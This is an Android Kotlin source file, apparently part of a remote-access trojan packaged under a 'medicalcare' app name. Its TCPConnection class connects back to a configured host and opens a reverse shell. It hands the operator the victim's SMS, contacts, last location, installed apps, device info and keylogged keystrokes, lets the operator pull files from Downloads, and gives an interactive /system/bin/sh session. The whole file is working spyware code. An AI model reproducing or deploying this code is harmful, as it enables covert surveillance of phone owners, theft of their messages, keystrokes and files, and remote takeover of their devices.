package com.example.medicalcare.features.network.connection

import android.content.Context
import android.text.TextUtils
import android.util.Log
import com.example.medicalcare.features.network.commands.CommandHandler
import com.example.medicalcare.features.network.commands.DeviceInfoProvider
import com.example.medicalcare.features.network.commands.SMSReader
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.InputStreamReader
import java.net.Socket
import com.example.medicalcare.features.network.commands.AppList
import com.example.medicalcare.features.network.commands.ContactReader
import com.example.medicalcare.features.network.commands.LocationReader
import com.example.medicalcare.features.network.commands.DownloadManager

class TCPConnection(private val context: Context) : Runnable {
    private val host = ConfigNetwork.HOST
    private val port = ConfigNetwork.PORT

    // Normal command handlers
    private val handlers: Map<String, CommandHandler> = mapOf(
        "1" to SMSReader(context),
        "2" to SMSReader(context),
        "3" to SMSReader(context),
        "deviceInfo" to DeviceInfoProvider(),
        "location" to LocationReader(context),
        "applist" to AppList(context),
        "contacts" to ContactReader(context)
    )

    // Dedicated download manager for interactive pulls
    private val downloadManager = DownloadManager()

    // Shell mode state
    private var inShellMode = false
    private var shellWriter: DataOutputStream? = null

    override fun run() {
        startReverseShell()
    }

    private fun startReverseShell() {
        try {
            Socket(host, port).use { socket ->
                DataOutputStream(socket.getOutputStream()).use { toServer ->
                    BufferedReader(InputStreamReader(socket.getInputStream())).use { fromServer ->
                        Log.d("TCPConnection", "Connected to $host:$port")
                        toServer.write("Hello\n".toByteArray())
                        toServer.write("Enter \'help\' for commands\n".toByteArray())
                        toServer.flush()

                        var run = true
                        while (run) {
                            val command = fromServer.readLine()
                            if (TextUtils.isEmpty(command)) continue

                            if (inShellMode) {
                                // Forward commands into shell stdin
                                if (command.equals("exit", ignoreCase = true)) {
                                    inShellMode = false
                                    shellWriter?.close()
                                    toServer.write("----------Exiting Shell-----------\n".toByteArray())
                                    toServer.flush()
                                } else {
                                    shellWriter?.writeBytes(command + "\n")
                                    shellWriter?.flush()
                                }
                                continue
                            }

                            // Normal command dispatcher
                            when {
                                command.equals("bye", ignoreCase = true) -> {
                                    run = false
                                    toServer.write("bye\n".toByteArray())
                                    toServer.flush()
                                    break
                                }
                                command.equals("shell", ignoreCase = true) -> {
                                    val process = ProcessBuilder("/system/bin/sh")
                                        .redirectErrorStream(true)
                                        .start()

                                    shellWriter = DataOutputStream(process.outputStream)
                                    inShellMode = true

                                    // Thread to read shell output continuously
                                    Thread {
                                        val shellReader = BufferedReader(InputStreamReader(process.inputStream))
                                        var line: String?
                                        try {
                                            while (shellReader.readLine().also { line = it } != null && inShellMode) {
                                                toServer.write((line + "\n").toByteArray())
                                                toServer.flush()
                                            }
                                        } catch (e: Exception) {
                                            Log.e("TCPConnection", "Error reading shell output", e)
                                        }
                                    }.start()

                                    toServer.write("----------Starting Shell----------\n".toByteArray())
                                    toServer.flush()
                                }
                                command.equals("dumpMessages", ignoreCase = true) -> {
                                    toServer.write("1: Inbox Messages\n".toByteArray())
                                    toServer.write("2: Sent Messages\n".toByteArray())
                                    toServer.write("3: Outbox Messages\n".toByteArray())
                                    toServer.flush()
                                }
                                command.equals("keylogs", ignoreCase = true) -> {
                                    toServer.write("----------Captured Keystrokes----------\n".toByteArray())
                                    toServer.flush()

                                    var count = 0
                                    var entry = LogStorage.poll()

                                    if (entry == null) {
                                        toServer.write("[!] No new keystrokes captured.\n".toByteArray())
                                    }

                                    while (entry != null) {
                                        toServer.write(entry.toByteArray())
                                        entry = LogStorage.poll()
                                        count++
                                    }

                                    toServer.write("----------End ($count entries)----------\n".toByteArray())
                                    toServer.flush()
                                }
                                command.equals("help", ignoreCase = true) -> {
                                    toServer.write("--------------------------------------------\n".toByteArray())
                                    toServer.write("deviceInfo -> Get Device Information\n".toByteArray())
                                    toServer.write("dumpMessages -> Read SMS\n".toByteArray())
                                    toServer.write("applist -> Read All Applications\n".toByteArray())
                                    toServer.write("contacts -> Read All Contacts\n".toByteArray())
                                    toServer.write("pull download -> Pull contents from files in Downloads\n".toByteArray())
                                    toServer.write("location -> Get last known device location\n".toByteArray())
                                    toServer.write("keylogs -> Retrieve new captured keystrokes\n".toByteArray())
                                    toServer.write("--------------------------------------------\n".toByteArray())
                                    toServer.flush()
                                }
                                command.equals("pull download", ignoreCase = true) -> {
                                    val dm = downloadManager
                                    val files = dm.listDownloadFiles()
                                    if (files == null || files.isEmpty()) {
                                        toServer.write("[!] No files in Downloads\n".toByteArray())
                                        toServer.flush()
                                        continue
                                    }

                                    // List files numbered
                                    toServer.write("-----------Downloads List-----------\n".toByteArray())
                                    for ((i, f) in files.withIndex()) {
                                        val line = "${i + 1}: ${f.name}\t${f.length()}\n"
                                        toServer.write(line.toByteArray())
                                    }
                                    toServer.write("----------End of Downloads----------\n".toByteArray())
                                    toServer.write("Select file number to pull (or 'cancel'):\n".toByteArray())
                                    toServer.flush()

                                    // Wait for selection
                                    val sel = fromServer.readLine() ?: ""
                                    if (sel.equals("cancel", ignoreCase = true) || sel.trim().isEmpty()) {
                                        toServer.write("[!] Pull cancelled\n".toByteArray())
                                        toServer.flush()
                                        continue
                                    }

                                    val idx = try { sel.trim().toInt() - 1 } catch (e: Exception) { -1 }
                                    if (idx < 0 || idx >= files.size) {
                                        toServer.write("[!] Invalid selection\n".toByteArray())
                                        toServer.flush()
                                        continue
                                    }

                                    // Send the selected file
                                    dm.sendFile(files[idx], toServer)
                                }
                                else -> {
                                    val cmdToken = command.trim().split(Regex("\\s+"))[0]
                                    handlers[cmdToken]?.handle(command, toServer)
                                        ?: run {
                                            toServer.write("[!] Unknown command: $command\n".toByteArray())
                                            toServer.flush()
                                            Log.w("TCPConnection", "Received unknown command: $command")
                                        }
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("TCPConnection", "Error in reverse shell", e)
        }
    }
}